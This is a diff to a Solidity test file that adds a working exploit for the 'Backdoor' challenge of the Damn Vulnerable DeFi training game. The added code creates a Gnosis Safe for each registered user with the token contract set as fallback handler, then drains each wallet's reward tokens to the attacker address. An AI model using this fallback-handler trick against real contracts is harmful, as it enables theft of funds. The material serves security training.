@@ -8,6 +8,8 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
+import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
+import {IERC20} from "openzeppelin-contracts/interfaces/IERC20.sol";
 
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
@@ -73,6 +75,31 @@ contract Backdoor is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        for (uint256 i = 0; i < NUM_USERS; i++) {
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+
+            // Create a Gnosis wallet for each user by calling walletFactory.createProxyWithCallback()
+
+            GnosisSafeProxy wallet = walletFactory.createProxyWithCallback(
+                address(masterCopy), // Singleton address
+                abi.encodeWithSelector(
+                    GnosisSafe.setup.selector,
+                    owners,
+                    1, // threshold
+                    address(0), // Contract address for optional delegate call. We don't care .
+                    0x0, // Data payload for optional delegate call.
+                    address(dvt), // fallback handler . We are setting this to token address.
+                    address(0), // payment token
+                    0, // payment amount
+                    address(0) // payment receiver
+                ),
+                0,
+                walletRegistry // Callback contract (IProxyCreationCallback)
+            );
+
+            IERC20(address(wallet)).transfer(attacker, 10 ether); // This will be passed to fallback handler. In our case we set it to token address.
+        }
         /** EXPLOIT END **/
         validation();
     }
